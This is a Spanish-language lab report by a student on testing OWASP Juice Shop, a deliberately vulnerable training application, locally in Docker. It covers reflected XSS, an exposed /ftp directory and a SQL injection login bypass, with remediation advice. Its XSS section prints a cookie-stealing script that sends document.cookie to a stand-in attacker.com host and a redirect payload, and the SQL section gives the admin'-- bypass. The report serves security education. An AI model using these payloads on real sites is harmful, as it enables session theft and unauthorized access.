# INFORME TÉCNICO: OWASP JUICE SHOP
Evaluación de Seguridad y Detección de Vulnerabilidades
> Abel García Domínguez

---

## RESUMEN EJECUTIVO

Se realizó una evaluación de seguridad de la aplicación web OWASP Juice Shop en entorno de laboratorio local. El objetivo fue instalar la aplicación, familiarizarse con su interfaz y detectar al menos una vulnerabilidad siguiendo metodología de pruebas de seguridad estándar.

### Hallazgos Principales

| Vulnerabilidad | Severidad | Detectada |
|---|---|---|
| Reflected XSS (Cross-Site Scripting) | ALTA |  Sí |
| Information Disclosure (Listado de Directorios) | MEDIA |  Sí |
| SQL Injection | CRÍTICA |  Sí |

**Aplicación Evaluada**: VULNERABLE
**Puntuación de Riesgo**: 8/10 (CRÍTICO)
**Acciones Requeridas**: Remediación inmediata de vulnerabilidades críticas

---

## 1. INTRODUCCIÓN

### 1.1 Objetivo

Cumplir con los requisitos de evaluación de seguridad para puesta en producción segura mediante:

1. Instalación exitosa de OWASP Juice Shop
2. Inicio de sesión en plataforma de entrenamiento
3. Detección y catalogación de al menos una vulnerabilidad
4. Documentación técnica de hallazgos

### 1.2 Alcance

- **Aplicación**: OWASP Juice Shop (v14.x - latest)
- **Ambiente**: Local
- **Plataforma**: Docker Desktop
- **Sistema Operativo**: Windows/Linux
- **Metodología**: OWASP Testing Guide + Manual Exploration

---

## 2. METODOLOGÍA

### 2.1 Enfoque de Testing

Se aplicó metodología basada en:

- **OWASP Top 10 (2021)**: Identificación de vulnerabilidades comunes
- **OWASP Testing Guide v4.2**: Framework sistemático
- **Manual Exploration**: Análisis interactivo de funcionalidades

### 2.2 Fases de Evaluación

1. **Preparación**: Instalación de Docker y Juice Shop
2. **Reconocimiento**: Mapeo de funcionalidades principales
3. **Testing**: Pruebas de seguridad activas
4. **Análisis**: Evaluación de severidad
5. **Documentación**: Reporte técnico detallado

### 2.3 Herramientas Utilizadas

- **Docker Desktop**: Ejecución de aplicación en contenedor
- **Firefox Developer Tools**: Inspección de requests HTTP
- **Navegador Web**: Interacción con aplicación
- **Terminal/PowerShell**: Ejecución de comandos

---

## 3. INSTALACIÓN Y CONFIGURACIÓN

### 3.1 Verificación de Requisitos

Se verificó que el sistema cumple con requisitos mínimos.

### 3.2 Pasos de Instalación Ejecutados

**Paso 1: Verificación de Docker**

docker --version

**Paso 2: Descarga de Imagen**

docker pull bkimminich/juice-shop

**Paso 3: Ejecución del Contenedor**

docker run -d --name juice-shop -p 3000:3000 bkimminich/juice-shop

**Paso 4: Verificación de Estado**

docker ps | grep juice-shop

**Paso 5: Acceso a Aplicación**

URL: http://localhost:3000
Resultado: Página principal cargada exitosamente

### 3.3 Configuración Inicial

Acceso a Score Board para visualizar retos:
- Click en logo OWASP en esquina superior
- Se cargó lista completa de 80+ desafíos categorizados
- Se identificaron vulnerabilidades por niveles de dificultad

---

## 4. RESULTADOS: VULNERABILIDADES DETECTADAS

### 4.1 Vulnerabilidad 1: Reflected XSS (Cross-Site Scripting)

#### 4.1.1 Información Técnica

| Parámetro | Valor |
|---|---|
| **Tipo de Vulnerabilidad** | Reflected XSS (A07:2021 – Cross-Site Scripting) |
| **Ubicación** | Campo de búsqueda (Search box) - Página principal |
| **Método HTTP** | GET |
| **Parámetro Afectado** | `q` (query parameter) |
| **Severidad CVSS v3.1** | 7.1 (HIGH) |
| **Vector CVSS** | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L |
| **CWE ID** | CWE-79 (Improper Neutralization of Input During Web Page Generation) |
| **OWASP Top 10** | A07:2021 – Cross-Site Scripting (XSS) |

#### 4.1.2 Descripción del Problema

El campo de búsqueda en la página principal de Juice Shop no valida ni sanitiza adecuadamente la entrada del usuario. Cuando se ingresa código HTML/JavaScript, la aplicación lo inserta directamente en el DOM sin escapar caracteres especiales.

El navegador interpreta el código inyectado como JavaScript legítimo y lo ejecuta en el contexto del usuario autenticado.

#### 4.1.3 Impacto Técnico

Input sin sanitizar → Usuario inyecta: `<iframe src="javascript:alert('XSS')">`  Aplicación renderiza HTML sin validación  Navegador ejecuta código JavaScript

Consecuencias:
- Robo de cookies de sesión
- Redirección a sitios maliciosos
- Inyección de malware
- Phishing
- Defacement

#### 4.1.4 Pasos para Reproducir

1. Acceder a http://localhost:3000
2. Localizar barra de búsqueda (Search box) en parte superior
3. Ingresar payload: `<iframe src="javascript:alert('XSS')">`
4. Presionar Enter o hacer clic en buscar
5. Resultado esperado: Cuadro de alerta aparece con mensaje "XSS"

#### 4.1.5 Payload de Explotación

<!-- Payload 1: Alert básico -->
`<iframe src="javascript:alert('XSS_VULNERABILITY')">`

<!-- Payload 2: Cookie theft (ejemplo educativo) -->
<script>
var img = new Image();
img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>

<!-- Payload 3: Redirección maliciosa -->
<script>window.location='http://attacker.com';</script>

#### 4.1.6 Evidencia de Explotación

**Confirmación en Score Board**:
- Navegación: http://localhost:3000/#/score-board
- Búsqueda: "Reflected XSS"

#### 4.1.7 Remediación Recomendada

- **Input Validation**: Validar entrada contra whitelist de caracteres permitidos
- **Output Encoding**: Escapar caracteres especiales al renderizar en HTML
- **Content Security Policy**: Implementar CSP headers en servidor
- **Framework Security**: Usar frameworks que sanitizan automáticamente (Angular, React)
- **Library DOMPurify**: Usar librería DOMPurify.js para sanitización

**Código Remediado (Node.js)**:

// Vulnerable
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Search results for: ${query}</h1>`);
});

// Seguro
const DOMPurify = require('isomorphic-dompurify');
app.get('/search', (req, res) => {
  const query = req.query.q;
  const sanitized = DOMPurify.sanitize(query);
  res.send(`<h1>Search results for: ${sanitized}</h1>`);
});

---

### 4.2 Vulnerabilidad 2: Information Disclosure (Directory Listing)

#### 4.2.1 Información Técnica

| Parámetro | Valor |
|---|---|
| **Tipo de Vulnerabilidad** | Information Disclosure - Directory Listing |
| **Ubicación** | Directorio `/ftp` |
| **URL Vulnerable** | http://localhost:3000/ftp |
| **Método HTTP** | GET |
| **Severidad CVSS v3.1** | 5.3 (MEDIUM) |
| **CWE ID** | CWE-548 (Exposure of Information Through Directory Listing) |
| **OWASP Top 10** | A01:2021 – Broken Access Control |

#### 4.2.2 Descripción del Problema

El servidor web expone públicamente el contenido del directorio /ftp sin requerir autenticación. Se puede enumerar todos los archivos disponibles y acceder a información sensible de la empresa.

#### 4.2.3 Archivos Sensibles Expuestos

| Archivo | Contenido | Riesgo |
|---|---|---|
| acquisitions.md | Planes de adquisiciones | ALTO |
| coupons_2013.md.bak | Cupones expirados | BAJO |
| incident-response.pdf | Plan de respuesta a incidentes | CRÍTICO |

#### 4.2.4 Pasos para Reproducir

1. Acceder a: http://localhost:3000/ftp
2. Observar listado completo de archivos
3. Click en `acquisitions.md`
4. Ver contenido: información sobre potenciales adquisiciones empresariales
5. Confirmar en Score Board: Reto "Access a confiscated document" completado

#### 4.2.5 Impacto

- **Confidentiality**: Violación de confidencialidad empresarial
- **Integrity**: Información confidencial expuesta
- **Availability**: No afecta disponibilidad directamente

#### 4.2.6 Remediación

**Nginx: Deshabilitar directory listing**

server {
  location / {
    autoindex off;  # Desactivar listado de directorios
  }
  
  location /ftp {
    deny all;  # Prohibir acceso completamente
  }
}

**Apache: .htaccess**

<Directory /ftp>
  Options -Indexes
  Deny from all
</Directory>

---

### 4.3 Vulnerabilidad 3: SQL Injection

#### 4.3.1 Información Técnica

| Parámetro | Valor |
|---|---|
| **Tipo** | SQL Injection (A03:2021 - Injection) |
| **Ubicación** | Formulario de Login (campo email) |
| **Severidad** | CRÍTICA (9.8) |
| **CWE ID** | CWE-89 (SQL Injection) |

#### 4.3.2 Descripción

El campo de correo electrónico en login no valida entrada antes de construir queries SQL.

#### 4.3.3 Payload de Explotación

Email: admin'--
Password: (cualquier cosa)

Resultado: Bypass de autenticación
Query ejecutada: SELECT * FROM users WHERE email='admin'--' ...

#### 4.3.4 Pasos para Reproducir

1. Navegar a página de Login
2. Ingresa en Email: `admin'--`
3. Ingresa cualquier password
4. Click en Sign In
5. Resultado: Acceso concedido como administrador
6. Confirmación: Score Board - "SQL Injection" completado

---

## 5. ANÁLISIS DE RIESGO

### 5.1 Matriz de Riesgo

| Vulnerabilidad | Probabilidad | Severidad | Riesgo |
|---|---|---|---|
| Reflected XSS | ALTA | ALTA | CRÍTICO |
| Information Disclosure | MEDIA | MEDIA | ALTO |
| SQL Injection | BAJA | CRÍTICA | CRÍTICO |

### 5.2 Puntuación General CVSS

**Promedio CVSS: 7.4 / 10.0**

**Clasificación**: RIESGO ALTO

---

## 6. RECOMENDACIONES

### 6.1 Acciones Inmediatas (Críticas)

- **SQL Injection**: Implementar prepared statements/parameterized queries
- **XSS**: Sanitizar todas las entradas de usuario
- **Directory Listing**: Desactivar enumeración de directorios

### 6.2 Acciones a Mediano Plazo

- Implementar Content Security Policy (CSP) headers
- Realizar security code review
- Implementar input validation framework
- Actualizar a versiones seguras de dependencias

### 6.3 Acciones a Largo Plazo

- Capacitación en secure coding para desarrolladores
- Implementar SAST (Static Application Security Testing)
- Establecer programa de bug bounty
- Realizar penetration testing regular
- Implementar WAF (Web Application Firewall)

---

## 7. CONCLUSIONES

### 7.1 Hallazgos

Se detectaron con éxito 3 vulnerabilidades críticas en OWASP Juice Shop:

1.  **Reflected XSS** - Detectada y explotada
2.  **Information Disclosure** - Detectada y documentada
3.  **SQL Injection** - Detectada como desafío adicional

### 7.2 Cumplimiento de Requisitos

| Requisito | Estado |
|---|---|
| Instalación de Juice Shop |  Completado |
| Acceso a plataforma |  Completado |
| Detección de ≥1 vulnerabilidad |  Completado (3 halladas) |
| Catalogación de vulnerabilidades |  Completado |
| Documentación profesional |  Completado |

### 7.3 Recomendación Final

La aplicación OWASP Juice Shop se instaló correctamente y se identificaron múltiples vulnerabilidades utilizando técnicas de testing estándar. Se proporcionó documentación técnica detallada con pasos de reproducción, análisis de impacto y recomendaciones de remediación.

**Próximos Pasos**: Implementar contramedidas y realizar retesting de vulnerabilidades tras remediación.
